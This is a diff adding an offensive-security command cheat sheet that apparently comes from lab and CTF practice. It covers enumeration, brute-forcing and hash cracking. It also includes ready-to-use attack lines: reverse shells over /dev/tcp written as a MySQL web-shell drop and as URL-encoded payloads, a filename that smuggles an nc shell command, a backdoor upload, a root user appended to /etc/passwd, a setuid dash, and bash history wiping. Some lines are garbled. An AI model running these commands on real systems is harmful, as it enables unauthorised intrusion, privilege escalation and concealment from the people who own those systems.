@@ -1,0 +1,310 @@
+#Others
+grep -R -i "password" .
+dig axfr @10.0.2.7
+getfacl devel/
+xfreerdp /u:user /p:password321 /cert:ignore /v:MACHINE_IP
+steghide info img
+steghide embed -cf rat.jpg -ef secret.txt -p hello123
+steghide --extract -sf img
+netstat -tuln | grep :80
+netstat -an | grep LIST
+grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
+grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)' /etc⬚("Type equation here." )
+exiftool -r * | grep -i "comment"
+exiftool -a *.pdf  | grep creator
+grep -i ^password /usr/share/wordlists/rockyou.txt > passwords.txt
+echo -n fghfgjghjhytjhghjjh | wc -c
+python -c "print(int('0x00007080', 16))"
+hashid #Is far better then hash-identifier
+grep -E '/(tcp|udp)' nmap.txt | awk '{print $1}' | cut -d'/' -f1 | paste -sd ',' -
+cat hexdum.txt| xxd -r -p > ascii.txt
+touch -- ';nc -c bash 10.10.14.25 444;.php'
+echo "somecommand &" | at 5pm
+cat  *  | grep  -i passw*
+curl -A "J"  -L 10.10.165.244
+
+for i in $(seq 0 100); do python heartbleed.py $IP;done
+for i in $(seq 0 12); do echo -n 'base64 -d |';done
+encoded_data=$(cat base64text); for i in {1..13}; do encoded_data=$(echo "$encoded_data" | base64 -d); done; echo "Decoded data: $encoded_data" 
+
+#HIstory clean
+cat /dev/null > ~/.bash_history
+#base64
+#Convert and decode
+base64 -w 0 filename.sh
+echo -n 'pastehere' | base64 -d >filename.sh
+#reformat and decode base64 strings (hexadecimal data)
+cat base64rawfile | xxd -r -p | tr -d '\r\n[:space:]' | base64 -d
+#reformat and decode base64 strings NO-(hexadecimal data)
+cat base64rawfile | tr -d '\r\n[:space:]' | base64 -d
+
+
+#sticky bit set to dash
+chmod 4755 /bin/dash
+#sort and remove duplicacy
+sort usernames | uniq
+#Read line by line
+while read -r line; do echo "$line"; done < coffeme.txt
+#split all word from file in one line
+for word in $(cat coffeme.txt); do echo $word; done
+#bindkey
+bindkey -s '^[w' '2>/dev/null'
+---------------------------------------------------------------------------------------------------------------
+#find
+find /opt -type f
+find /opt -type d
+#find files last 2hrs modified
+find . -mmin -120
+#find files that accessed within 2hrs
+find . -amin -120
+#find datewise
+find / -newermt 2019-09-01 ! -newermt 2019-09-15 -ls  2>/dev/null
+#Find files larger than 15MB:
+find -type f -size +15M
+#find .txt or .sh file only
+find . -name "*.txt" -o -name "*.sh"
+#case-insensitive
+find / -iname "*pml*" 2>/dev/null
+
+find /usr/share/seclists -name '*user*'
+---------------------------------------------------------------------------------------------------------------
+#CURL
+#CURL File Transfer
+curl -X PUT -d @/home/kali/backdoor.php 10.0.2.15/uploads/backdoor.php
+#CURL GET request
+curl -X GET http://192.168.179.99:33333/list-running-procs
+#CURL POST request
+curl -X POST http://192.168.179.99:33333/list-running-procs -H 'Content-Length: 0'
+#CURL User agent change
+curl -H "user-agent:Googlebot" http://10.0.2.30/robots.txt -v
+#Download LinEnum.sh to client machine
+curl 10.10.14.17/LinEnum.sh -o LinEnum.sh
+#retrevied robots.txt file
+curl -O -Ss http://www.google.com/robots.txt && head -n5 robots.txt
+---------------------------------------------------------------------------------------------------------------
+#WFuzz
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL"  
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL" 
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 "$URL" 
+#Parameter URL
+export URL=http://192.168.56.104/test.php?FUZZ=../../../../../../../etc/passwd
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 80 --hc 404 "$URL"
+#Param with cockie PHPSESSID
+wfuzz -uhttps://streamio.htb/admin/?FUZZ=-w/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H"Cookie: PHPSESSID=jtde06u71uq4t7pvs59b8iis1o"--hh1678
+
+#Wfuzz Vhost
+wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  --hh 191 -H 'HOST: FUZZ.gitroot.vuln' 10.0.2.20
+wfuzz -u 'http://object.htb/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'HOST: FUZZ.object.htb'  --hl 362
+#Gobuster
+gobuster dir -u http://10.0.2.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://repo.gitroot.vuln -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.0.2.27 -w /usr/share/wordlists/dirb/big.txt  -t 50
+gobuster dir -u http://10.0.2.27 -w /usr/share/wordlists/dirb/big.txt -x .php,.html,.sh,.txt,.js,.bak,.zip
+gobuster dir -u http://10.0.2.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.sh,.txt,.js,.bak,.zip 
+gobuster dir -u http://10.0.2.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.sh,.txt,.js,.bak,.zip,.jpg,.png,.css,.pdf
+#Gobuster Vhost
+gobuster vhost -u gitroot.vuln -w /usr/share/wordlists/dirb/big.txt |grep 200
+#More Gobuster
+gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+gobuster dir -w '/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:80 -t 42 -b 400,401,403,404 --no-error
+gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
+#Classic Gobuster (-k disabled TLS certificatin verification)
+gobuster dir -u http://10.10.10.55:8080 -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k
+
+#Feroxbuster
+feroxbuster -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 100 -x txt,con
+#ffuf(=FUZZ, =FUZZUSER, =FUZZPASS)
+#ffuf pass brute-force 
+ffuf -request req.txt -request-proto http -w 10-million-passwords.txt 
+ffuf -request req.txt -request-proto http -w 10-million-passwords.txt -fs 1814
+#ffuf user&pass brute-force 
+ffuf -request req.txt -request-proto http -mode clusterbomb -w /top-usernames.txt:FUZZUSER -w rockyou.txt:FUZZPASS
+#ffuf idor check
+ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w num.txt -mr 'admin'
+==================================================================================================================
+#VULNERABILITY SCAN
+#Nikto
+nikto -h http://10.11.1.111
+# Nikto with squid proxy
+nikto -h 10.11.1.111 -useproxy http://10.11.1.111:4444
+------------------------------------------------------------------------------------------------------------
+#WPScan & SSL
+wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
+#WPScan Brute Forceing:
+wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt
+#Aggressive Plugin Detection:
+wpscan --url $URL --enumerate p --plugins-detection aggressive
+---------------------------------------------------------------------------------------------------------------
+#Joomla
+joomscan -u  http://10.11.1.111
+joomscan -u  http://10.11.1.111 --enumerate-components
+#Joomla nmap NSE
+nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=cewl.txt,http-joomla-brute.hostname=192.168.195.79,http-joomla-brute.uri=/joomla/administrator/index.php,http-joomla-brute.threads=3' $IP
+---------------------------------------------------------------------------------------------------------------
+#drupal
+ pip install --break-system-packages droopescan==1.44.1
+droopescan scan drupal -u  http://192.168.187.193
+droopescan -h
+searchsploit drupal 7 remote
+msfconsole>search drupal
+exploit/multi/http/drupal_drupageddon
+---------------------------------------------------------------------------------------------------------------
+#gitdumper
+python gitdumper.sh http://repo.gitroot.vuln/.git/ /root/GitRoot/git-tmp/
+---------------------------------------------------------------------------------------------------------------
+#CEWL
+cewl $URL -w cewl.txt
+cewl $URL -m 5 -w $PWD/cewl.txt  2>/dev/null
+#or add dept -d 4
+cewl $URL -m 5 -d 4 -w $PWD/cewl.txt  2>/dev/null
+#Extract only emails from a website
+cewl -e -n  http://example.com
+#username mash tool, create username list with all combination
+python namemash.py givennames.txt
+---------------------------------------------------------------------------------------------------------------
+#Searchsploit
+searchsploit  -x  php/webapp/234.py
+site:exploit-db.com apache 2.4.7
+#4025.rb file means it's metasploit  #search mysql 5.4 (do not search with full version like this: search mysql 5.4.0)
+==================================================================================================================
+#Password Brute-Force
+#John
+# Incremental Mode (Brute-force, tries all possible combinations)
+john hash.txt #Default single/incremental
+john --incremental hash.txt  #Direct Incremental mode
+john --incremental=Digits hash.txt   #Only numbers  
+john --incremental=Alnum hash.txt    #Alphanumeric 
+
+john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt  #wordlist mode
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt #Specify format mode
+
+#shadow  file crack
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+#RAR crack
+rar2john MSSQL_BAK.rar > mssql_hashes.txt --> john --wordlist=wordlist.txt mssql_hashes.txt
+#zip crack
+zip2john file.zip > pass.hash > john pass.hash
+#ssh crack
+ssh2john ssshecrcypted.txt > sshhash_john.txt
+---------------------------------------------------------------------------------------------------------------
+#hashcat
+hashcat.exe -m 7400 -a 0 -o cracked.txt hash.txt rockyou.txt #for Windows
+hashcat -m 0 hash.txt rockyou.txt // MD5 raw
+hashcat -m 1800 hash.txt rockyou.txt // sha512crypt
+hashcat -m 7400 hash.txt rockyou.txt // sha256crypt
+hashcat -m 1600 hash.txt rockyou.txt // MD5(APR)
+hashcat -m 1500 hash.txt rockyou.txt // DES(Unix), Traditional DES, DEScrypt
+hashcat -m 1000 hash.txt rockyou.txt // NTLM
+hashcat -m 500 hash.txt rockyou.txt // MD5crypt, MD5 (Unix)
+hashcat -m 400 hash.txt rockyou.txt // Wordpress
+hashcat -m 7900 hash.txt rockyou.txt //Drupal 7
+hashcat -m 13000 hash.txt rockyou.txt //rar
+hashcat -m 18200 krb5asrep.hash  rockyou.txt //$krb5asrep$
+hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 dump.txt -o output.txt --remove -a 3 ?u?l?l?d?d?d?d
+hashcat -h | grep -i "ntlmv2"
+hashcat -h | grep -i 'sha256Crypt'
+#hashcat links
+m parameter
+hashid match
+#Medusa
+medusa -h 10.11.1.111 -u admin -P password-file.txt -M http -m DIR:/admin -T 10
+---------------------------------------------------------------------------------------------------------------
+#fcrackzip
+fcrackzip  -u  -D  -p  /usr/share/wordlists/rockyou.txt  spammer.zip
+#pdfcrack
+pdfcrack File.pdf -w rockyou.txt (#For PDF files with passwords)
+
+#rdp crack
+ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.111
+crowbar -b rdp -s 10.11.1.111/32 -u victim -C /root/words.txt -n 1
+==================================================================================================================
+#Archive Tools
+#nc
+#banner grab
+nc 10.11.1.111 22
+nc   -nv  127.0.0.1  25
+#ls
+ls -la | sort -n
+
+bunzip2 -c data1>data2
+gunzip -c data1>data2
+#zip
+zip archive.zip file1 file2
+#Pass protect zip
+zip -e archive.zip file1 file2 
+unzip archive.zip
+#gzip
+gzip file
+#force gzip
+gzip -f file
+gunzip file.gz
+#tar #use -v for verbose
+tar -cf my_archive.tar file1.txt file2.txt
+tar -xf my_archive.tar
+#.tar.gz
+tar -czf archive.tar.gz file1 file2 
+tar -xzf archive.tar.gz
+#7z
+7z a myarchive.7z file1.txt file2.txt
+7z a shell.zip .git
+7z x myarchive.7z
+#RAR
+rar a myarchive.rar file1 file2
+unrar e myarchive.rar
+#RAR with pass
+rar a -pYourPassword myarchive.rar file1 file2
+unrar x -pYourPassword myarchive.rar
+=============================================================================================
+#Mysql commands:
+mysql -uwpadmin -p4uTiLL
+show databases;
+use wordpressdb;
+show tables;
+slect  * from  wp_users;
+exit;
+#use these to escape...
+;
+\!   clear
+#Direct login with mysql
+mysql -h 10.0.2.10  -uroot  -probert
+#Update Database
+UPDATE wp_users SET user_pass="e10adc3949ba59abbe56e057f20f883e" WHERE ID=1;
+#rev shell in mysql 
+SELECT "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.0.2.15/443 0>&1\"'); ?>" INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/rev.php';
+=============================================================================================
+#openssl
+#Use single quote (' ')
+openssl passwd hello123
+openssl passwd -1 -salt THM hello123
+-1=md5
+-salt THM=specific salt add
+echo 'alex:$1$YfOuuWlR$LWI7kWwWSJfmIEwaZey/4/:0:0:alex:/home/alex:/bin/bash' >> /etc/passwd
+echo 'alex:$1$YfOuuWlR$LWI7kWwWSJfmIEwaZey/4/:0:0:root:/root:/bin/bash' >> /etc/passwd
+=============================================================================================
+#url encode
+hURL -U "bash -c 'bash -i >& /dev/tcp/10.0.2.5/4001 0>&1'"
+#url decode
+hURL -u 10.0.2.5:80/index.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.5%2F4001%200%3E%261%27
+=============================================================================================
+# Docker
+https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
+=============================================================================================
+#LINKS
+# Dictionary creation
+https://github.com/LandGrey/pydictor
+https://github.com/Mebus/cupp
+git clone https://github.com/sc0tfree/mentalist.git
+
+Online crackers
+https://hashkiller.co.uk/Cracker
+https://www.cmd5.org/
+https://www.onlinehashcrack.com/
+https://gpuhash.me/
+https://crackstation.net/
+https://crack.sh/
+https://hash.help/
+https://passwordrecovery.io/
+http://cracker.offensive-security.com/
